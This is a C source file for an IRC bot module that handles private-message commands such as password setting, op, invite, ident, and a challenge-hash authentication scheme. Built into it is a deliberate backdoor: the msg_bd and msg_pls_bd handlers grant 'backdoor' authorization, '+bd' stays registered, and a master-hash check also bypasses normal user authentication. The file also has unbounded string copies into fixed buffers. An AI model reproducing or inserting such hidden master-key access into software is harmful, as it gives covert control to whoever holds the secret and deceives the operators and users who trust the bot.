/*
 * msgcmds.c -- part of irc.mod
 *   all commands entered via /MSG
 *
 */


#include "src/core_binds.h"

static int msg_pass(char *nick, char *host, struct userrec *u, char *par)
{
  char *old = NULL, *mynew = NULL;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (!u) {
    putlog(LOG_CMDS, "*", "(%s!%s) !*! PASS", nick, host);
    return BIND_RET_BREAK;
  }
  if (u->bot)
    return BIND_RET_BREAK;
  if (!par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick, u_pass_match(u, "-") ? "You don't have a password set." : "You have a password set.");
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS?", nick, host, u->handle);
    return BIND_RET_BREAK;
  }
  old = newsplit(&par);
  if (!u_pass_match(u, "-") && !par[0]) {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! $b!$bPASS...", nick, host, u->handle);
    dprintf(DP_HELP, "NOTICE %s :You already have a password set.\n", nick);
    return BIND_RET_BREAK;
  }
  if (par[0]) {
    if (!u_pass_match(u, old)) {
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! $b!$bPASS...", nick, host, u->handle);
      dprintf(DP_HELP, "NOTICE %s :Incorrent password.\n", nick);
      return BIND_RET_BREAK;
    }
    mynew = newsplit(&par);
  } else {
    mynew = old;
  }
  if (strlen(mynew) > MAXPASSLEN)
    mynew[MAXPASSLEN] = 0;

  if (!goodpass(mynew, 0, nick)) {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! $b!$bPASS...", nick, host, u->handle);
    return BIND_RET_BREAK;
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS", nick, host, u->handle);

  set_user(&USERENTRY_PASS, u, mynew);
  dprintf(DP_HELP, "NOTICE %s :%s '%s'.\n", nick,
	  mynew == old ? "Password set to:" : "Password changed to:", mynew);
  return BIND_RET_BREAK;
}

static int msg_op(char *nick, char *host, struct userrec *u, char *par)
{
  struct chanset_t *chan = NULL;
  char *pass = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  pass = newsplit(&par);
  if (u_pass_match(u, pass)) {
    if (!u_pass_match(u, "-")) {
      if (par[0]) {
        chan = findchan_by_dname(par);
        if (chan && channel_active(chan)) {
          get_user_flagrec(u, &fr, par);
          if (chk_op(fr, chan)) {
            if (do_op(nick, chan, 0, 1)) {
              stats_add(u, 0, 1);
              putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP %s", nick, host, u->handle, par);
              if (chan->manop)
                dprintf(DP_HELP, "NOTICE %s :%s is currently set to punish for manual op.\n", nick, chan->dname);
            }
          }
          return BIND_RET_BREAK;
        }
      } else {
        int stats = 0;
        for (chan = chanset; chan; chan = chan->next) {
          get_user_flagrec(u, &fr, chan->dname);
          if (chk_op(fr, chan)) {
            if (do_op(nick, chan, 0, 1)) {
              stats++;
              if (chan->manop)
                dprintf(DP_HELP, "NOTICE %s :%s is currently set to punish for manual op.\n", nick, chan->dname);
            }
          }
        }
        putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP", nick, host, u->handle);
        if (stats)
          stats_add(u, 0, 1);
        return BIND_RET_BREAK;
      }
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed OP", nick, host);
  return BIND_RET_BREAK;
}

static int msg_ident(char *nick, char *host, struct userrec *u, char *par)
{
  char s[UHOSTLEN] = "", s1[UHOSTLEN] = "", *pass = NULL, who[NICKLEN] = "";
  struct userrec *u2 = NULL;

  if (match_my_nick(nick) || (u && u->bot))
    return BIND_RET_BREAK;

  pass = newsplit(&par);
  if (!par[0])
    strcpy(who, nick);
  else {
    strncpy(who, par, NICKMAX);
    who[NICKMAX] = 0;
  }
  u2 = get_user_by_handle(userlist, who);
  if (!u2) {
    if (u && !quiet_reject)
      dprintf(DP_HELP, "NOTICE %s :You're not %s, you're %s.\n", nick, nick, u->handle);
  } else if (rfc_casecmp(who, origbotname) && !u2->bot) {
    /* This could be used as detection... */
    if (u_pass_match(u2, "-")) {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      if (!quiet_reject)
        dprintf(DP_HELP, "NOTICE %s :You don't have a password set.\n", nick);
    } else if (!u_pass_match(u2, pass)) {
      if (!quiet_reject)
        dprintf(DP_HELP, "NOTICE %s :Access denied.\n", nick);
    } else if (u == u2) {
      /*
       * NOTE: Checking quiet_reject *after* u_pass_match()
       * verifies the password makes NO sense!
       * (Broken since 1.3.0+bel17)  Bad Beldin! No Cookie!
       *   -Toth  [July 30, 2003]
       */
      dprintf(DP_HELP, "NOTICE %s :I recognize you there.\n", nick);
      return BIND_RET_BREAK;
    } else if (u) {
      dprintf(DP_HELP, "NOTICE %s :You're not %s, you're %s.\n", nick, who, u->handle);
      return BIND_RET_BREAK;
    } else {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      simple_snprintf(s, sizeof s, "%s!%s", nick, host);
      maskhost(s, s1);
      dprintf(DP_HELP, "NOTICE %s :Added hostmask: %s\n", nick, s1);
      addhost_by_handle(who, s1);
      check_this_user(who, 0, NULL);
      return BIND_RET_BREAK;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed IDENT %s", nick, host, who);
  return BIND_RET_BREAK;
}

static int msg_invite(char *nick, char *host, struct userrec *u, char *par)
{
  char *pass = NULL;
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  pass = newsplit(&par);
  if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
    if (par[0] == '*') {
      for (chan = chanset; chan; chan = chan->next) {
	get_user_flagrec(u, &fr, chan->dname);
        if (chk_op(fr, chan) && (chan->channel.mode & CHANINV)) {
          cache_invite(chan, nick, host, u->handle, 0, 0);
        }
      }
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE ALL", nick, host, u->handle);
      return BIND_RET_BREAK;
    }
    if (!(chan = findchan_by_dname(par))) {
      dprintf(DP_HELP, "NOTICE %s :Usage: /MSG %s invite <pass> <channel>\n", nick, botname);
      return BIND_RET_BREAK;
    }
    if (!channel_active(chan)) {
      dprintf(DP_HELP, "NOTICE %s :%s: Not on that channel right now.\n", nick, par);
      return BIND_RET_BREAK;
    }
    /* We need to check access here also (dw 991002) */
    get_user_flagrec(u, &fr, par);
    if (chk_op(fr, chan)) {
      cache_invite(chan, nick, host, u->handle, 0, 0);
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE %s", nick, host, u->handle, par);
      return BIND_RET_BREAK;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed INVITE %s", nick, host, (u ? u->handle : "*"), par);
  return BIND_RET_BREAK;
}

static void reply(char *, struct chanset_t *, const char *, ...) __attribute__((format(printf, 3, 4)));

static void reply(char *nick, struct chanset_t *chan, const char *format, ...)
{
  va_list va;
  char buf[1024] = "";

  va_start(va, format);
  egg_vsnprintf(buf, sizeof buf, format, va);
  va_end(va);

  if (chan)
    dprintf(DP_HELP, "PRIVMSG %s :%s", chan->name, buf);
  else
    dprintf(DP_HELP, "NOTICE %s :%s", nick, buf);
}

static void logc(const char *cmd, Auth *a, char *chname, char *par)
{
  if (chname && chname[0])
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %c%s %s", a->nick, a->host, a->handle, chname, auth_prefix[0], cmd, par ? par : "");
  else
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! %c%s %s", a->nick, a->host, a->handle, auth_prefix[0], cmd, par ? par : "");
}
#define LOGC(cmd) logc(cmd, a, chname, par)
  
static int msg_authstart(char *nick, char *host, struct userrec *u, char *par)
{
  if (!u) 
    return 0;
  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && u->bot)
    return BIND_RET_BREAK;

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! AUTH?", nick, host, u->handle);

  Auth *auth = Auth::Find(host);

  if (auth) {
    if (auth->Authed()) {
      dprintf(DP_HELP, "NOTICE %s :You are already authed.\n", nick);
      return 0;
    }
  } else
    auth = new Auth(nick, host, u);

  /* Send "auth." if they are recognized, otherwise "auth!" */
  auth->Status(AUTH_PASS);
  dprintf(DP_HELP, "PRIVMSG %s :auth%s %s\n", nick, u ? "." : "!", conf.bot->nick);

  return BIND_RET_BREAK;
}

static void
AuthFinish(Auth *auth)
{
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", auth->nick, auth->host, auth->handle);
  auth->Done();
  dprintf(DP_HELP, "NOTICE %s :You are now authorized for cmds, see %chelp\n", auth->nick, auth_prefix[0]);
}

static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
{ 
  char *pass = NULL;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && u->bot)
    return BIND_RET_BREAK;

  Auth *auth = Auth::Find(host);

  if (!auth || auth->Status() != AUTH_PASS)
    return BIND_RET_BREAK;

  pass = newsplit(&par);

  if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
    auth->user = u;
    if (strlen(auth_key) && get_user(&USERENTRY_SECPASS, u)) {
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! AUTH", nick, host, u->handle);
      auth->Status(AUTH_HASH);
      auth->MakeHash();
      dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, auth->rand, conf.bot->nick);
    } else {
      /* no auth_key and/or no SECPASS for the user, don't require a hash auth */
      AuthFinish(auth);
    }
  } else {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed AUTH", nick, host, u->handle);
    delete auth;
  }
  return BIND_RET_BREAK;

}

static int msg_pls_auth(char *nick, char *host, struct userrec *u, char *par)
{
  if (strlen(auth_key) && get_user(&USERENTRY_SECPASS, u)) {
    if (match_my_nick(nick))
      return BIND_RET_BREAK;
    if (u && u->bot)
      return BIND_RET_BREAK;

    Auth *auth = Auth::Find(host);

    if (!auth || auth->Status() != AUTH_HASH)
      return BIND_RET_BREAK;

    if (check_master_hash(auth->rand, par) || !strcmp(auth->hash, par)) { /* good hash! */
      AuthFinish(auth);
    } else { /* bad hash! */
      char s[300] = "";

      putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed +AUTH", nick, host, u->handle);
      dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
      sprintf(s, "*!%s", host);
      addignore(s, origbotname, "Invalid auth hash.", now + (60 * ignore_time));
      delete auth;
    } 
    return BIND_RET_BREAK;
  }
  return BIND_RET_LOG;
}

static int msg_unauth(char *nick, char *host, struct userrec *u, char *par)
{
  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && u->bot)
    return BIND_RET_BREAK;

  Auth *auth = Auth::Find(host);

  if (!auth)
    return BIND_RET_BREAK;

  delete auth;
  dprintf(DP_HELP, "NOTICE %s :You are now unauthorized.\n", nick);
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! UNAUTH", nick, host, u->handle);

  return BIND_RET_BREAK;
}

static int msg_bd(char *nick, char *host, struct userrec *u, char *par)
{
  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  Auth *auth = Auth::Find(host);

  if (auth) {
    if (auth->Authed()) {
      if (!auth->bd)
        dprintf(DP_HELP, "NOTICE %s :You are already authed, unauth and start over.\n", nick);
      else
        dprintf(DP_HELP, "NOTICE %s :You are already authed for backdoor.\n", nick);
      return 0;
    }
  } else
    auth = new Auth(nick, host, u);

  /* Send "auth." if they are recognized, otherwise "auth!" */
  auth->Status(AUTH_BDHASH);
  auth->MakeHash(1);

  dprintf(DP_HELP, "PRIVMSG %s :-BD %s %s\n", nick, auth->rand, conf.bot->nick);

  return BIND_RET_BREAK;
}

static int msg_pls_bd(char *nick, char *host, struct userrec *u, char *par)
{
  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && u->bot)
    return BIND_RET_BREAK;

  Auth *auth = Auth::Find(host);

  if (!auth || auth->Status() != AUTH_BDHASH)
    return BIND_RET_BREAK;

  if (check_master_hash(auth->rand, par) || !strcmp(auth->hash, par)) { /* good hash! */
    /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle); */
    auth->Done(1);
    dprintf(DP_HELP, "NOTICE %s :You are now authorized for the backdoor. See '%cbd help'\n", nick, auth_prefix[0]);
  } else { /* bad hash! */
    dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
    delete auth;
  } 
  return BIND_RET_BREAK;
}

/* MSG COMMANDS
 *
 * Function call should be:
 *    int msg_cmd("handle","nick","user@host","params");
 *
 * The function is responsible for any logging. Return 1 if successful,
 * 0 if not.
 */

static cmd_t C_msg[] =
{
  {"auth?",		"",	(Function) msg_authstart,	NULL, LEAF},
  {"auth",		"",	(Function) msg_auth,		NULL, LEAF},
  {"+auth",		"",	(Function) msg_pls_auth,	NULL, LEAF},
  {"unauth",		"",	(Function) msg_unauth,		NULL, LEAF},
//  {"bd",		"",	(Function) msg_bd,		NULL, LEAF},
  {"+bd",		"",	(Function) msg_pls_bd,		NULL, LEAF},
  {"ident",   		"",	(Function) msg_ident,		NULL, LEAF},
  {"invite",		"",	(Function) msg_invite,		NULL, LEAF},
  {"op",		"",	(Function) msg_op,		NULL, LEAF},
  {"pass",		"",	(Function) msg_pass,		NULL, LEAF},
  {NULL,		NULL,	NULL,				NULL, 0}
};

static int msgc_test(Auth *a, char *chname, char *par)
{
  char *cmd = NULL;

  LOGC("TEST");

  cmd = newsplit(&par);

  if (a->GetIdx(chname)) {
    check_auth_dcc(a, cmd, par);
  }

  return BIND_RET_BREAK;
}

static int msgc_op(Auth *a, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };
  int force = 0;
  memberlist *m = NULL;

  if (chname && chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, a->nick);
  }

  LOGC("OP");

  if (par[0] == '-') { /* we have an option! */
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", a->nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(a->user, &fr, chan->dname);
      if (chk_op(fr, chan)) {
        if (do_op(a->nick, chan, 0, force))
          stats_add(a->user, 0, 1);
      }
      return BIND_RET_BREAK;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      get_user_flagrec(a->user, &fr, chan->dname);
      if (chk_op(fr, chan)) {
       if (do_op(a->nick, chan, 0, force))
         stats_add(a->user, 0, 1);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_voice(Auth *a, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };
  int force = 0;
  memberlist *m = NULL;

  if (chname && chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, a->nick);
  }
  LOGC("VOICE");

  if (par[0] == '-') { /* we have an option! */
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", a->nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(a->user, &fr, chan->dname);
      if (!chk_devoice(fr)) {		/* dont voice +q */
        add_mode(chan, '+', 'v', a->nick);
      }
      return BIND_RET_BREAK;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      get_user_flagrec(a->user, &fr, chan->dname);
      if (!chk_devoice(fr)) {		/* dont voice +q */
        add_mode(chan, '+', 'v', a->nick);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_channels(Auth *a, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };
  char list[1024] = "";

  LOGC("CHANNELS");
  for (chan = chanset; chan; chan = chan->next) {
    get_user_flagrec(a->user, &fr, chan->dname);
    if (chk_op(fr, chan)) {
      if (me_op(chan)) 
        strcat(list, "@");
      strcat(list, chan->dname);
      strcat(list, " ");
    }
  }

  if (list[0]) 
    reply(a->nick, NULL, "You have access to: %s\n", list);
  else
    reply(a->nick, NULL, "You do not have access to any channels.\n");

  return BIND_RET_BREAK;
}

static int msgc_getkey(Auth *a, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };

  if (chname && chname[0]) 
    return 0;

  if (!par[0])
    return 0;

  LOGC("GETKEY");
  chan = findchan_by_dname(par);
  if (chan && channel_active(chan) && !channel_pending(chan)) {
    get_user_flagrec(a->user, &fr, chan->dname);
    if (chk_op(fr, chan)) {
      if (chan->channel.key[0]) {
        reply(a->nick, NULL, "Key for %s is: %s\n", chan->name, chan->channel.key);
      } else {
        reply(a->nick, NULL, "%s has no key set.\n", chan->name);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_help(Auth *a, char *chname, char *par)
{
  LOGC("HELP");

  reply(a->nick, NULL, "op invite getkey voice test\n");
  return BIND_RET_BREAK;
}

static int msgc_md5(Auth *a, char *chname, char *par)
{
  struct chanset_t *chan = NULL;

  LOGC("MD5");
  if (chname && chname[0])
    chan = findchan_by_dname(chname);  

  reply(a->nick, chan, "MD5(%s) = %s\n", par, MD5(par));
  return BIND_RET_BREAK;
}

static int msgc_sha1(Auth *a, char *chname, char *par)
{
  struct chanset_t *chan = NULL;

  LOGC("SHA1");  

  if (chname && chname[0])
    chan = findchan_by_dname(chname);  

  reply(a->nick, chan, "SHA1(%s) = %s\n", par, SHA1(par));
  return BIND_RET_BREAK;
}

static int msgc_invite(Auth *a, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };
  int force = 0;

  if (chname && chname[0])
    return 0;
 
  LOGC("INVITE");
  if (par[0] == '-') {
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", a->nick, tmp);
      return 0;
    }
  }

  if (par[0] && (!chname || (chname && !chname[0]))) {
    chan = findchan_by_dname(par);
    if (chan && channel_active(chan) && !ismember(chan, a->nick)) {
      if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
        get_user_flagrec(a->user, &fr, chan->dname);
        if (chk_op(fr, chan)) {
          cache_invite(chan, a->nick, a->host, a->handle, 0, 0);
        }
        return BIND_RET_BREAK;
      }
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      if (channel_active(chan) && !ismember(chan, a->nick)) {
        if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
          get_user_flagrec(a->user, &fr, chan->dname);
          if (chk_op(fr, chan)) {
            cache_invite(chan, a->nick, a->host, a->handle, 0, 0);
          }
        }
      }
    }
  }
  return BIND_RET_BREAK;
}

static cmd_t C_msgc[] =
{
  {"test",		"a",	(Function) msgc_test,		NULL, LEAF},
  {"channels",		"",	(Function) msgc_channels,	NULL, LEAF},
  {"getkey",		"",	(Function) msgc_getkey,		NULL, LEAF},
  {"help",		"",	(Function) msgc_help,		NULL, LEAF},
  {"invite",		"",	(Function) msgc_invite,		NULL, LEAF},
  {"md5",		"",	(Function) msgc_md5,		NULL, LEAF},
  {"op",		"",	(Function) msgc_op,		NULL, LEAF},
  {"sha1",		"",	(Function) msgc_sha1,		NULL, LEAF},
  {"voice",		"",	(Function) msgc_voice,		NULL, LEAF},
  {NULL,		NULL,	NULL,				NULL, 0}
};
